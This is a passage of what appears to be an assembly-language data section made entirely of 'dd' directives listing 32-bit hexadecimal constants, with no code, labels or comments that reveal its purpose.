		dd 0C872DA71h, 7CC81CD0h, 0DA54EDDFh, 0ECCDF36Ch, 0FC3D239Ah
		dd 65CEEAFh, 6B387175h,	270862BFh, 42B9F1AFh, 0C93CB0AAh
		dd 821DA33Ch, 0CA39DBC6h, 4B187271h, 72ADEE56h,	0DEF943D4h
		dd 84E74A13h, 0C65871DDh, 0EEC69A20h, 977A17EAh, 8FFCC95Fh
		dd 8F29CF71h, 0CCA4950h, 9F3A001Ch, 0F699AD44h,	97E8FF24h
		dd 8BBE5192h, 0DC0F67FAh, 961893DCh, 0A18A78E4h, 23788D01h
		dd 8312158Ah, 7B15C479h, 9733471Dh, 108EB60h, 0DDC38DFDh
		dd 26931A3Dh, 0D996BDE6h, 0EC4E2E81h, 1D0C0C4Ah, 0C0DF9BEh
		dd 0F0AA6B63h, 1FA22225h, 0E173EB57h, 401F98F5h, 74E2A40Ch
		dd 0EDC15746h, 368A3DCCh, 8BB423F5h, 6C850A10h,	2946B9Ch
		dd 3996ADD6h, 70BDF244h, 0C3A1E4E5h, 311C3D19h,	536CE68Dh
		dd 5FDB22B0h, 250BF07Fh, 0D298FBB9h, 0AA4CFC3Eh, 0E787707Fh
		dd 2EEAF964h, 0BC5712A7h, 88D2016Bh, 0C9588CE5h, 0F7248FD7h
		dd 8F1F132Ah, 7A8C8451h, 0FBF041F1h, 3B22F802h,	0ED4A6168h
		dd 35C3CF6Fh, 0FCD0474Ch, 0C855D71Dh, 0E572511Eh, 0B03DAD6Ah
		dd 95BEFCD8h, 0D363B6AFh, 0BCD960BEh, 0D5FAED5Eh, 3EFF9D7Ah
		dd 81271FCDh, 4763846h,	9DFD7818h, 0CE7738E7h, 63B032DEh
		dd 0BD29A0A4h, 70CE5793h, 0B405FB24h, 0A2174386h, 29F343EEh
		dd 6DFA76CFh, 0B2BD44F9h, 0E4C15BC2h, 0EA451756h, 6B088F1Eh
		dd 0AB5220E0h, 0D3F0AEA0h, 0C7B639E9h, 0CEE8A15Dh, 307D37FDh
		dd 0FE3FD52Bh, 0B7C2335Fh, 51C41C73h, 0FECEFAAh, 4556F1B8h
		dd 0D690AFDDh, 0B37CB5DFh, 0F9DF1E41h, 0E9CBB5E5h, 17903EBh
		dd 0FDB013AFh, 927AD8B4h, 3D702DF4h, 3E862C71h,	6A2FA33Ah
		dd 0E98AA4F3h, 0B01E506Fh, 5104FA5Bh, 0BFE1B493h, 4D207F82h
		dd 914896AEh, 0FB9C6B0Bh, 47E7A0C7h, 9AEA7AF8h,	0E2D31903h
		dd 6D04A956h, 8A0D123Fh, 0CE79BF03h, 7CA75D4Dh,	0E039C1C0h
		dd 426CBE64h, 2F9DEA92h, 0CAC2E06Ch, 268C9A3Bh,	58F2FA64h
		dd 0FFE7E795h, 55546742h, 0AFFA7AC2h, 0D0947F02h, 0DC37A603h
		dd 0D21FEAB8h, 0A676A5E0h, 2730F62h, 8CDA1E18h,	0C06531FAh
		dd 0F7B3CD96h, 773BC1E2h, 0B7E10280h, 0B139D286h, 7D9293A1h
		dd 48E8448Ah, 8EDB34C4h, 217BE43Bh, 45D4791Ch, 4E0AAA49h
		dd 8D132954h, 0F2115F5h, 0DDFCA9B8h, 3D023B4Ah,	684266Bh
		dd 5921C8D2h, 0C23DA0ECh, 2E72932h, 206582B4h, 24B0A91Ah
		dd 49DC64B1h, 507DCA99h, 4BF7D175h, 0ECDCE0E5h,	0CD93F9DFh
		dd 0B954BA87h, 0C4747EE8h, 0F2AED3C8h, 2CA5B41Dh, 0B59DF591h
		dd 8276696Eh, 0B33864D7h, 7738A305h, 8A0C201Bh,	145D4C4Ch
		dd 962C3086h, 3ED6EBAFh, 0AE8E886Bh, 0FCCC950Eh, 0E9A80228h
		dd 0D235AA05h, 41FDFAE7h, 452038A8h, 2D94E616h,	1375DC93h
		dd 285D5C7Fh, 5BEE88C9h, 0C64A6C96h, 1EEADF21h,	0FD423F7Ch
		dd 545F6BB6h, 9BF47BA0h, 5B4AAA56h, 886014E6h, 0D91C12ACh
		dd 1B90C175h, 1B81DD67h, 0EA95BD6Bh, 2ABAB2C9h,	4CBF5F92h
		dd 0E1FF0629h, 91841926h, 377ABD45h, 2554F329h,	0BA79B604h
		dd 35B76A61h, 0A62D8BF2h, 5F09D6D4h, 8049380Ch,	2C706E67h
		dd 0DD44C77h, 3F69AFABh, 7053282Fh, 46219203h, 37A3BD8Ch
		dd 1345A0E9h, 0F8BF1625h, 0AD68F1A0h, 73C260C5h, 0F9F73375h
		dd 97A5498Dh, 0A83D7B96h, 0D5C63482h, 0BDE2676Bh, 0C22B89DBh
		dd 0B829DB50h, 334BD94h, 0FAC36FF2h, 7ACF0711h,	0A576EE6Ch
		dd 0E9794E8Eh, 58F909DCh, 918A4C8Eh, 0AF3500FFh, 0EC976031h
		dd 5CF5FBD7h, 691B56D1h, 26029171h, 41584D3Bh, 95DC10EEh
		dd 0C32C12A6h, 634F3049h, 0DE0D70B4h, 53DB1794h, 92936B3Ch
		dd 0ADAA0E11h, 0F2BE902Fh, 0CBDE2A7Bh, 72DA8D2Ah, 7CC97923h
		dd 0ED997989h, 0AABC82A6h, 0D5506157h, 0ADA716FDh, 15B5730Fh
		dd 0A1E4F061h, 0B1123691h, 0A2A4573Dh, 0EBB14C9Dh, 0E6D1713Bh
		dd 36E9E8F0h, 9ED10F1Bh
		dd 0D4F5E4E9h, 0D965AA64h, 0B75AD75Fh, 0D2D69B16h, 4C7EDF1Bh
		dd 4229E121h, 8AE67D6Dh, 0DFB0BEE7h, 1530E729h,	14A47CE7h
		dd 962D083Ch, 0E4D4E6F5h, 0C4ACDA3Bh, 0E9631963h, 0A42BB603h
		dd 1300F161h, 0C968CD61h, 523DF45Bh, 0F98BD19Dh, 8A90A639h
		dd 0A201F28Fh, 0BADB7EDAh, 61C43AE8h, 76C65853h, 10C7994Ch
		dd 24BAB745h, 8C1512CCh, 22922B73h, 751D2E61h, 0F39F6F0Ah
		dd 3545602Fh, 0C1901244h, 0BA74E9C4h, 0F044673Bh, 0BA8DDCA8h
		dd 0A3793AB5h, 1805D02Bh, 0D96AD401h, 1DF0D1CEh, 3EAAEFE2h
		dd 0A0B6D5E6h, 0F8F789Eh, 0CE46CE89h, 709A0614h, 46CB531Bh
		dd 17457058h, 0B261444Eh, 43EB478h, 3AE34429h, 63D20ED4h
		dd 0BD52FE37h, 0CDF64483h, 0E0107107h, 0E4A5D823h, 38DF2B37h
		dd 91861097h, 26671243h, 94ADDAF9h, 2F704623h, 54CA6F36h
		dd 0A967CCF0h, 5A407D5Ch, 0CCAA05BDh, 0EE822693h, 529AADC0h
		dd 12887CF3h, 0D28F607Ch, 0EDE69E5Ah, 43691B38h, 9B8C9F7Fh
		dd 0EEB68934h, 1EEE506Bh, 5A14D63Dh, 0FF7A3391h, 4ECC3544h
		dd 3D546907h, 444C5815h, 0BB948BD7h, 623F316Dh,	780602A5h
		dd 0D6880ED6h, 4BABFBA5h, 0DCDBAB17h, 11319301h, 737D050Ah
		dd 897930C1h, 6C6E22FFh, 57557594h, 0A49378F3h,	0B1A5A80Ch
		dd 0B2CC3BBh, 0E8272346h, 0D1EE1D9Eh, 3AC3134Ch, 1E20ED79h
		dd 609C122h, 37CFB99Dh,	0EE3D1A7Dh, 9D745973h, 1A66B7BEh
		dd 0F87B1972h, 0F3264639h, 72D3576Ch, 2F339DD1h, 0FB5EEBA2h
		dd 7A8DFDF1h, 4A4C141Ch, 3D98CBFEh, 2AF364F7h, 8AD42F8Fh
		dd 577F0DDEh, 0DAB5C8F1h, 0C9F305C6h, 0F77516A6h, 279FE352h
		dd 26FC00h, 0FF8CF0D5h,	9338B09Bh, 2C7E907Dh, 7E8F62E1h
		dd 676192DAh, 0C6BABF05h, 7A51D2E3h, 6C77F5D4h,	0F8509ED1h
		dd 0F9696A01h, 0D57CB034h, 2645443Ch, 60E52742h, 2E81720Dh
		dd 0E3841962h, 5CC165D4h, 7A95A3A0h, 6BE898C2h,	0B08C2020h
		dd 4E050DD5h, 9E2D899Fh, 350420CCh, 0DD888170h,	71632CF7h
		dd 784868BEh, 0C7E929A8h, 7C8C71C3h, 74F35A90h,	0B5A41BACh
		dd 1102AAEAh, 6991328Ah, 299EAA39h, 0C8BA44B1h,	9B8B5CC2h
		dd 5D0BB192h, 54A48D84h, 6DDB2EDDh, 6F46C02Bh, 0E5AD6BAFh
		dd 0A0C3F812h, 3E8A9AEAh, 0B1BA75B1h, 0F7FFC07Eh, 57258D1Ch
		dd 67919B35h, 0CC6D8F88h, 0BB187A35h, 4A92D20Eh, 0E3589D7Ch
		dd 0D837FC62h, 0ACB9473Dh, 7CD17887h, 854B8AFDh, 0D9BB4851h
		dd 9EB838C2h, 688B753Ah, 0F77B0340h, 0DD60C164h, 8827D276h
		dd 0C7C5D2EBh, 3C07F9B9h, 0A95DCD91h, 0EDD9C6FBh, 8801EE9h
		dd 2E1FE29Bh, 0F8A076EEh, 226B7C4Dh, 67AC23A8h,	9B646217h
		dd 2029371Bh, 900E6635h, 1E41829Bh, 0FDD1D6A1h,	0D4F5FB2Ch
		dd 0EEF0B31Eh, 314E15A1h, 75C35093h, 0FABAE622h, 0C1C1A810h
		dd 0F4EE38F8h, 2320625h, 0DF2A3A55h, 7DE99AC8h,	82F70ED3h
		dd 98A9A797h, 0C9C824DFh, 0A16CBAA2h, 0A17C9896h, 113215ECh
		dd 0FE361D10h, 0FCD8CCh, 0DD6862F1h, 37AA1BF2h,	577DED09h
		dd 0B07F88A3h, 0B104B94Dh, 0E8D3286Eh, 717A8FD3h, 0AAAF050Fh
		dd 8CF7030Eh, 0B7919872h, 0B5D9D4A2h, 0DC505CB5h, 0C5D859F6h
		dd 0D6243586h, 0EF4CDCAFh, 81529E94h, 124F9B34h, 29F6A9F0h
		dd 0B550F95Ch, 28880437h, 0C4CA61F5h, 0FCEC5C32h, 840281CEh
		dd 7213C7BBh, 0DD7266FAh, 0C5FF43B9h, 0AC96150Dh, 440D5C8Dh
		dd 37C7640Fh, 902D9847h, 1655FF3Eh, 0A2575A2Fh,	476E058h
		dd 0D615DCB7h, 0D3C1DFB4h, 6B680CEEh, 0AA91BBE4h, 17CFFA3Ch
		dd 0DEA415E2h, 0C599EE2Fh, 297775FCh, 939199C1h, 0F90852C8h
		dd 0BFA6A865h, 6B18EE0Ah, 22BE2562h, 8F2193ECh,	7C4AD0E6h
		dd 86EF15D3h, 3D4A1AEh,	765C8E7Eh, 0FC536DE3h, 0D34F3F28h
		dd 0E53217A6h, 0EB9A3AAh, 0B2B69426h, 0C30F88D3h, 274A61EAh
		dd 75777718h, 30A84819h, 0E5CC8D9Ch, 0A67A7AB4h, 465498ECh
		dd 92D05332h, 34D5E001h, 7B65A347h, 0F870573Fh,	0B66FCE85h
		dd 4A6C8BEBh, 0FCE619F5h, 0B7587F6Bh, 0C36C7CFh, 0FD885AB6h
		dd 3698B3C9h, 927C57h, 8AAA4558h, 0C0C898D9h, 7EBF7521h
		dd 3DFF39E3h, 0F983D9F6h, 8B960800h, 0E9B565Dh,	0B513254Dh
		dd 0BDBDF980h, 3B7FB15Fh, 399CF66h, 0CFE0BBC5h,	50CCEAB0h
		dd 5A0AC3C2h, 0B17A9EF6h, 0CCF651D0h, 21854367h, 0D3815A5Bh
		dd 5C32751h, 0B27797A1h, 0E063B6B2h, 0EDD54068h, 59804623h
		dd 941D7F2Dh, 0D4920296h, 90F579E4h, 1BD6E233h,	48DC26DBh
		dd 76097B33h, 0C743169Ch, 488D7761h, 0C3672246h, 0C59B9C6Dh
		dd 1247FDB8h, 1ACF41BBh, 0E3D046A9h, 16CBE846h,	0DDF73566h
		dd 0EBE29167h, 0B967F22Fh, 0B35DEB4Ah, 0ED8674E2h, 0C178EC61h
		dd 57C3E873h, 0E09E19Eh, 0FEA9B46Bh, 26AC8234h,	0D6048A62h
		dd 46289470h, 738F47B4h, 1189C0BDh, 8B8DF16Ch, 4C923A80h
		dd 39C99172h, 0A38FD30Bh, 0E7CD699h, 0BC1C633Dh, 8FFB7F39h
		dd 83249E15h, 3C96A99Ch, 4D4F30C9h, 0FAB9A661h,	5DE72598h
		dd 0C07DDC89h, 4A016534h, 16B1FE09h, 6C69FA3Ch,	0C58074D5h
		dd 0CA6BFF80h, 0C8F32CF9h, 0E3944FACh, 0BCA48E5Dh, 8A0C038Bh
		dd 44E46823h, 55EE4263h, 6419E2F5h, 0FE4A5286h,	435481C8h
		dd 0AF2C09EAh, 90012D64h, 0E1D96CAEh, 2ADC89A0h, 7D5F9157h
		dd 0FEA5E900h, 0D2F0CDFAh, 245FB368h, 1A1D39A7h, 89995AFAh
		dd 232995ACh, 906BE4B9h, 5B7CA8B9h, 46693964h, 0FDE791Dh
		dd 85D22BA6h, 0A706BAF3h, 919048A5h, 962E9BC8h,	0C22175BEh
		dd 29C61E0Eh, 6C27E24Ch, 91102439h, 0B06BE0C1h,	0C60979B4h
		dd 0D81762A8h, 331674F4h, 9E2EFEE8h, 0D56669BEh, 5B39B714h
		dd 0D62A678Ch, 0A25D6DE0h, 3FD23BB4h, 3F9FC9AFh, 0CD51D6DCh
		dd 0D70AE00Fh, 53F49479h, 1865079Eh, 783FB111h,	5551AC9Ch
		dd 0D4CD598h, 48A82CCBh, 0ABBBBAF4h, 45FB9D04h,	2A8796EAh
		dd 3A3CA7BDh, 475F4758h, 0BD0CE954h, 1817E66Eh,	10958546h
		dd 0D2DBBFF7h, 2226D325h, 8759036Ch, 6DF56130h,	9FB7CD09h
		dd 0F4DEF944h, 0D8A6B653h, 0E6A8E96Ch, 0E2C4359Eh, 0B510DCB8h
		dd 7A6D2543h, 17B024E1h, 1419051Dh, 0FEC2C1A5h,	3FC83C83h
		dd 0B91B5320h, 58E09EE9h, 8EC4646Eh, 22482BCBh,	1D9AD564h
		dd 36211CCCh, 0FF18F2E5h, 0ADD22A84h, 0DEEEAD93h, 8F704D42h
		dd 0D025821Ah, 0EF5521FBh, 760843C1h, 1CD9586Ch, 0E11492CFh
		dd 97C8A86Eh, 0D55C6FEEh, 647F941Ch, 82802B7h, 1E719532h
		dd 29531191h, 0AC33E4E9h, 0A2C85E8Bh, 524B78BEh, 9E1D2578h
		dd 0EDD8A7A9h, 1105B15Dh, 3165B608h, 0BD29AC16h, 0BD79BAD1h
		dd 0BB0DA443h, 96EA0241h, 59BE1A4Fh, 0F6020283h, 0C0695623h
		dd 0FE683625h, 1EE91546h, 0AFF9C051h, 0D02B8B6Bh, 0A0F4B73Ah
		dd 0C72F1240h, 9219378Ah, 506A9DDCh, 9B2642E3h,	36A19ECAh
		dd 5DEC9339h, 0FB8451CAh, 0FFA1AEF3h, 7DC4B987h, 0CDAACAF6h
		dd 99DC33BAh, 0D8B2E999h, 0B6931DD6h, 0BA8A0DB8h, 4F045C49h
		dd 9321CB31h, 0CFB897C3h, 468D8A1Fh, 1940FAh, 600B7BFh
		dd 9BACF0ABh, 23C87E1Dh, 0E16354D5h, 6A6C321Dh,	5200414Fh
		dd 0EBA3D5EEh, 0CBBB8691h, 14549103h, 0B6E4DE8h, 0EE1DE5A1h
		dd 82E5D3BBh, 35BBBF41h, 5522D5C3h, 2FAD6AEh, 8C255AEAh
		dd 8BB26672h, 74392758h, 0BB43A632h, 608A03FCh,	4184BCE6h
		dd 0AC791C03h, 0D3BA4503h, 0FFEC0A7h, 1CBFF86Dh, 0ED400612h
		dd 2191871Ch, 0F3859D9Bh
		dd 91B60F0Eh, 76949775h, 0AF053C70h, 0AD5B89E4h, 835FB441h
		dd 98B5AF6Ch, 0EB16725Ah, 0F143CAD5h, 56FDE6FEh, 0F52E5A9Bh
		dd 7F8D25Dh, 0C3E3ED41h, 0D23DE85Fh, 60FDA2A1h,	7CB779D2h
		dd 64B5113Dh, 3B48B1E3h, 7584A34Dh, 735E007h, 0DF637EE5h
		dd 0A46DE0B1h, 5EE2530h, 0E8FC7D4Fh, 3D660D2Ah,	52729DBCh
		dd 858207C9h, 0D0D444E5h, 2ED7D417h, 718D655Dh,	0CE03108Dh
		dd 7EF011E9h, 14F01EC8h, 4A69FAB5h, 1115A088h, 408211EDh
		dd 67E67964h, 0E96B7E43h, 6B8857AFh, 34720885h,	0C57988B7h
		dd 0B4F633ADh, 44200749h, 0FA46E31Ch, 0B21E30DEh, 0BA12FCBFh
		dd 99241E03h, 0D3892ECDh, 0F874ACDFh, 0D28E7F4Fh, 0FE3DD9Ah
		dd 0E58B9777h, 0FF886301h, 48F1BD81h, 9AA30880h, 3D9C996Dh
		dd 8F2F0F31h, 6EC81EAFh, 9EF4B398h, 0F7E8C03Eh,	9096EB69h
		dd 0DF6D66CAh, 73F8C9B2h, 63DD6B3Dh, 15F48317h,	8677953Fh
		dd 326BA097h, 10ED24B1h, 110DD3F9h, 20A1DA79h, 0A01FFCECh
		dd 601466AAh, 9FB5FCh, 3F4A2618h, 101E7ADFh, 3B716020h
		dd 120C5BDFh, 7C305F14h, 3F81C277h, 0B211A9Bh, 9CD6BE3h
		dd 65BFF435h, 0CDA5705Fh, 0FA209228h, 0A0A831D6h, 7C4486CDh
		dd 0B96CDAABh, 7C1C743Bh, 0A0D164DBh, 0EF787564h, 0ECC3B73Dh
		dd 0F3812284h, 56E5A0EBh, 0F6E00B3Fh, 913698E3h, 0BE87DBD5h
		dd 0C295F43Ch, 0D8D5B0B6h, 83905DE5h, 2C7D6779h, 52F15A04h
		dd 659FD9A3h, 0F02AAA11h, 2BB228B2h, 8A6205D8h,	4CFF65FBh
		dd 9B6D0822h, 0F98AE7E5h, 0CF4C0E4Ch, 412B75A8h, 2957EA3Eh
		dd 0A9EE2E2Ah, 8D3AAC4Dh, 0E387E3E3h, 77AE91BBh, 0C83D72D4h
		dd 6339D220h, 0C4EE3A63h, 8354E0E9h, 0E7E77E79h, 9CFD0C69h
		dd 8C08E13Dh, 30D3AA81h, 4055A184h, 4603D169h, 1214F463h
		dd 7AF3D7DBh, 0AF6D25B7h, 3237574Dh, 9DF238A7h,	6EC0714Eh
		dd 0D44F3C21h, 7DE699CAh, 60EF68E6h, 159C9C04h,	0DA9D345Dh
		dd 5ACB62D2h, 550ACEDDh, 4C77F977h, 0D05C3A2Bh,	0D4FC7314h
		dd 0ABC584E2h, 385D57E7h, 0E8FBE07Fh, 94B6A449h, 97910E83h
		dd 0AED609B7h, 0FF162623h, 66DDC9D3h, 1042F268h, 97D1373Fh
		dd 0DBF53FEBh, 0A3308B63h, 0C0F419D3h, 5C3AE145h, 0E7E69811h
		dd 3ACF2EB2h, 6DF53953h, 29DC25EEh, 91411BF3h, 0DCAED94Fh
		dd 7E6D110Eh, 450F63FDh, 0B52135E2h, 3A2428DFh,	0EA00BEDEh
		dd 455ECD32h, 0E41E92EBh, 0E2087C5Eh, 7C93273Ch, 0C7490863h
		dd 57DC0923h, 7A6A7C2Ah, 46EF562Ch, 56266E52h, 0F5861700h
		dd 91DD111Ah, 0EAB8C5CFh, 0C8FDFE00h, 0D0EC38BFh, 0D2FD5975h
		dd 3783689Fh, 0F9CF1EA3h, 3A320820h, 0DED43589h, 0A51F7BC0h
		dd 86A48CA2h, 0E0AA81B5h, 0B1D3F84Dh, 2EA62C19h, 94F03379h
		dd 4D480A78h, 16B08062h, 0D1ED97F3h, 6049C805h,	8C905439h
		dd 0CF86504Eh, 0FB56C915h, 8F666D5h, 18D7540Bh,	8467CFD4h
		dd 0DFFCB708h, 58C150D4h, 879312BFh, 461DC584h,	0B305CA03h
		dd 0DA463D5Bh, 0F875182Ch, 0E55756DAh, 0FFE67A3Ah, 0BCF8582Dh
		dd 7AB8F9DAh, 373201Fh,	8DAB4Ch, 13823156h, 5E5F4CA0h
		dd 0BEC7A176h, 15DCDA25h, 805D6EB6h, 39DB24B0h,	0D68ED112h
		dd 2F7C196Fh, 9368B4A8h, 0EAA1A8F3h, 0F0AD98F0h, 82678530h
		dd 0B8B9426Fh, 201741F3h, 974672C5h, 33D65F31h,	2B64E992h
		dd 728495C0h, 63A8FEB4h, 4D863655h, 0DA960B46h,	3C994216h
		dd 0B3DDC931h, 0A3999527h, 0EC177C10h, 0F9C2BB81h, 91036DCEh
		dd 8851F993h, 46244726h, 777E8EB7h, 1D316A42h, 76B1523Fh
		dd 0A4F34711h, 0FDEAF6FDh, 462431E3h, 2AFCC1A1h, 0F922106Ch
		dd 0C0E891D0h, 7C7DEB0Eh, 7E3DA61Ah, 0C2D12ED4h, 8E0E1640h
		dd 0CF5CDB58h, 0DE47A988h, 0D8DEF8A3h, 26C6BFE5h, 0EBA98B8Eh
		dd 40FC6A9Ch, 0ECF3536Fh, 0B6DCA46Ah, 2567C6E4h, 4732E040h
		dd 0A418EB67h, 4E39F917h, 7CDFC4CAh, 88AE2F17h,	279E922Fh
		dd 664119EAh, 56CCCDB8h, 0C4BF581Eh, 1086C530h,	0A02956A7h
		dd 6E30345Ah, 23FF3B6Dh, 82C04AB0h, 0FAA41442h,	1F8EDE85h
		dd 3957500Fh, 4AE059D3h, 0E01993CBh, 0F1C7A1F4h, 3EF89B2Dh
		dd 0F9BE5B34h, 15497345h, 0C4C7122h, 0C2724F0Bh, 3FE19DB0h
		dd 6B05A6BEh, 14C5D001h, 0A51B83F9h, 6CEAE7B0h,	0F25AA03h
		dd 2EEB2752h, 57427FE2h, 8EFE2610h, 0D0F7D991h,	83D7856Eh
		dd 0E8C6B68Bh, 338302FAh, 0EBA33AA4h, 33AAB698h, 0D29CE748h
		dd 480259Dh, 33199449h,	3BB25106h, 17FE6303h, 0FEE56E41h
		dd 0BE8AE801h, 4113B475h, 23BFC9D8h, 3FEDDB53h,	56E370Bh
		dd 0E91DC1Ch, 78182881h, 0B4B53ED0h, 690BD4B4h,	41DA52E3h
		dd 86292CA3h, 0E5B6C768h, 1568355Ah, 0A1BB1952h, 2402E76Eh
		dd 0CFA30166h, 1D8E3945h, 56084359h, 2390DB8Ch,	0EB94A68Bh
		dd 51D43A84h, 0C0DC96Fh, 50BB66F9h, 25368B00h, 0C01AB3D4h
		dd 7FA9E144h, 73E86D90h, 8C85BE5Bh, 9DE3CA33h, 0A2847E29h
		dd 4C8D5531h, 550B5387h, 0D641D670h, 590C60C1h,	37000656h
		dd 35295D52h, 0BCCC5D2Fh, 0B3C226CAh, 24E91942h, 0EBCEA222h
		dd 0FFC8E7DBh, 655ADBBDh, 0AC062798h, 8B04233Fh, 68F672D7h
		dd 0BDDDAC1h, 87DEEE5Ch, 0FE3E332Dh, 97BEE39Ah,	0BEF56646h
		dd 0BE03941Eh, 4AC7B945h, 0F805E628h, 90F761C8h, 0FC03F0D0h
		dd 6AFA9EA4h, 0FF2E14D0h, 0E26D14A2h, 9DC95278h, 7F0CF612h
		dd 7D26C23Eh, 93153EAh,	3CE81DA6h, 8F13F6A4h, 18FBA435h
		dd 5AFB266Ah, 0DBC293F0h, 0B7CF18A7h, 0AA28D897h, 0E378F9CBh
		dd 0DB05EF04h, 5664B9A8h, 0F9451745h, 0BA96E66Fh, 9A04F134h
		dd 1DD5C266h, 4243A7C5h, 0EF7F7AEh, 0B3B70126h,	7E94A11Bh
		dd 2AED2D7Bh, 0F71A7B51h, 0EBA09122h, 981C82C7h, 5974467Ah
		dd 3B397C5Ch, 3A3D26AFh, 0F37D73B9h, 7FB7419Bh,	0B9EAFB78h
		dd 0B418AA8Eh, 60F13BABh, 0C935215h, 0B0E4AB33h, 2E8C3B3Dh
		dd 0DB24EC75h, 0A73000B2h, 0C40C1634h, 1812ABA9h, 1CD0E0FFh
		dd 94E280h, 7E37DA22h, 9C24BBEh, 16AD1307h, 116C9310h
		dd 77614B57h, 0E4BAE64Bh, 0DDC874DFh, 8CF49598h, 0B9656F3Eh
		dd 6946C7EFh, 0AA962FEh, 65A77814h, 1FC332D7h, 5E2F33C2h
		dd 14A771CCh, 942A5D1Ch, 0D5B4818Bh, 549E62CBh,	0DB290CEh
		dd 0C81E55C9h, 165D129Bh, 20F3138Eh, 76A57B89h,	0E84D8827h
		dd 28A2A639h, 3397A6CFh, 0F3AF6C5h, 0D3EAAC22h,	5772FAE9h
		dd 3FED3A89h, 0C298F448h, 54E4B3FDh, 9570B9A4h,	0B842D2EEh
		dd 0A490DD27h, 0B6A3977h, 0C3B900D9h, 1F916F89h, 114413E3h
		dd 80044FD3h, 227FF069h, 123A8533h, 0CCFA251Eh,	0C93344F1h
		dd 71CA9A2Ah, 0A38DA312h, 2D695640h, 8FE6A11Fh,	83E57E16h
		dd 0AF2FFD15h, 5C615BF2h, 0DCC2F222h, 8B6F7F41h, 152C08ABh
		dd 692D973Dh, 49E98FE8h, 0CED7951Eh, 5B4667C8h,	21CE3BC6h
		dd 112FF9D4h, 0B42792C8h, 0DF384E9Ch, 0A02C4303h, 0A12B88D0h
		dd 0F7C60E77h, 408C6F8Ch, 0A51D3CCEh, 969F45D9h, 0D197F77Fh
		dd 0CFDD1D38h, 6F868DA8h, 4C2D323Fh, 0BC92B877h, 0D7CD94E6h
		dd 0ED66F53Fh, 0A7149217h, 735FDF75h, 85BB521Ch, 793918C7h
		dd 39DBFA5Eh, 0BA75D766h, 225BB09Ah, 6F21C258h,	1873C627h
		dd 0E295BA95h, 1A9C2E74h, 7FE6E9C9h, 9C766745h,	379D40F5h
		dd 0DF97283Fh, 54651409h, 0DF08DC5Ah, 718233C6h, 0AAE08AD6h
		dd 908F6639h, 1CCD6329h, 0A74C854Eh, 0A6E952AAh, 0EFBF530Eh
		dd 59B7798Bh, 0FDEA737Fh
		dd 251EB8CEh, 7A335364h, 0B91889D6h, 0F08BDECAh, 0CE865012h
		dd 43D3A794h, 0E127125Ah, 0F59DADF0h, 9EEBC6A0h, 159FD1C7h
		dd 72B394ABh, 0C35641C5h, 0CCCED140h, 28627D60h, 7F4AB3FEh
		dd 0A2E6F883h, 9D8F0F63h, 1CBBB67Eh, 5A40F357h,	6CE7E957h
		dd 9D0B22E3h, 6D9079A4h, 91059F41h, 0DAC828C0h,	1794B64Ah
		dd 412776C9h, 7A39556Ah, 0D27E5678h, 655A6B49h,	0CEC22856h
		dd 0B6F1432Ah, 94342044h, 0E8B74ECDh, 0A4AFF36Fh, 0ED075BE6h
		dd 95532EC3h, 9D90F877h, 0A8F21B4Ah, 0CDB3149Ah, 0A3A5067Eh
		dd 0DDCBAF5h, 98272487h, 3A24BCCCh, 0DE1354ECh,	0C3FCDF1h
		dd 47EC63BFh, 51E59CE6h, 2FB2727h, 41E52849h, 19C4D732h
		dd 0D3A0A3BBh, 45D97C66h, 0B641171Fh, 737138BEh, 0D75E291Dh
		dd 52B1DAF7h, 28312552h, 19BF3EB1h, 0A5300FFCh,	0FB9D6AB1h
		dd 0F36FC0C9h, 24417D0Fh, 4AC022B5h, 0E4277FA3h, 0DCB1FAABh
		dd 587A12CCh, 0CFE9BCD1h, 9AB0E5A0h, 0CEA0B57Dh, 0EE02D351h
		dd 0D7BA038Eh, 6572521Eh, 0F6466DCDh, 0C62328B7h, 61B7F8ACh
		dd 7158BF8Ah, 2EE88343h, 0A261D496h, 0D7693499h, 910DF7EDh
		dd 0AE374D5Fh, 62A76974h, 0FD84B4B5h, 7D394BB9h, 728DCD07h
		dd 35DF122Eh, 0CED6C6D4h, 8A2C5B84h, 0B9E1D69Dh, 0A0872F5Dh
		dd 777BC0C3h, 4E0A837Dh, 0A085582Eh, 90C0F226h,	0DC5C64F7h
		dd 0E6F82FF3h, 0BB413F76h, 799E57CAh, 75582A90h, 7879291Fh
		dd 863FCE6Eh, 441C278h,	609EF20h, 78CF13Eh, 0CB352D8Eh
		dd 0A8868B8Eh, 0D618EE4Bh, 0C3374614h, 912D6494h, 87AD65E6h
		dd 0E9992F1Ah, 3DF401A2h, 830CE87Bh, 10C7566Fh,	7718D295h
		dd 0B058DD63h, 6003601Bh, 0CDF23741h, 293B569Dh, 83D760B7h
		dd 932B8B1Fh, 1521ED7Dh, 0E1237F10h, 46240A3Fh,	0BDF544A3h
		dd 0FE67892Bh, 143A0205h, 0F42F2ABAh, 963B880Ah, 0ED7ECAD1h
		dd 0A331FB58h, 8E9DB1E4h, 5E05DFBh, 0D817FD31h,	0D4FF6501h
		dd 0C412DC2Ch, 0B8958E7Ah, 15CEA264h, 7E46A8FBh, 93EE9D61h
		dd 404602D9h, 0E0054063h, 0EDCC85DEh, 21ACF82Ah, 0D4B0DAADh
		dd 0A7B8AD44h, 0FDD0A9F0h, 93A7E1E7h, 0E6DDF9E4h, 5272D8A2h
		dd 95B04B77h, 5D2D5690h, 15975B59h, 0BDDFB715h,	2BDA5A2Ch
		dd 14B8B7B4h, 0A0E8B3EDh, 0DD7C2AD6h, 865C7E91h, 7DA38975h
		dd 950B6C5Ah, 78BC000Ah, 0D14ED28Dh, 0CD2D9CBCh, 0A7017CE8h
		dd 4A488966h, 4164433h,	0F4DD70A8h, 6B60BE7Ah, 0F3F1602Dh
		dd 82321CA6h, 5B090F58h, 8259C282h, 0CD290F70h,	2268844Ch
		dd 0F3BCEB2Ch, 0EA4F275Dh, 43CC3465h, 3E68B77h,	0C9310D86h
		dd 2F781339h, 52FE9C6Fh, 64A9689h, 69E58D41h, 3EC057A2h
		dd 4866CDD2h, 89A1A3F2h, 0E9285AE7h, 0F6249A74h, 6727BBD7h
		dd 19E4D466h, 6144CC39h, 0A28506E8h, 1C2797FFh,	0C0EAD02Fh
		dd 2318BAFCh, 0AF695BCh, 226B2E23h, 0B2C65585h,	0F8EE51DBh
		dd 1AAFC7EBh, 9A8F8E92h, 88B54DCCh, 0EE78C228h,	0D32D9170h
		dd 5233F8F1h, 4D05746Ah, 0E6CC8DFDh, 3E55DF81h,	942C745Ch
		dd 0D4DE6411h, 15B4142Eh, 0D3949DAFh, 225F201Bh, 94806450h
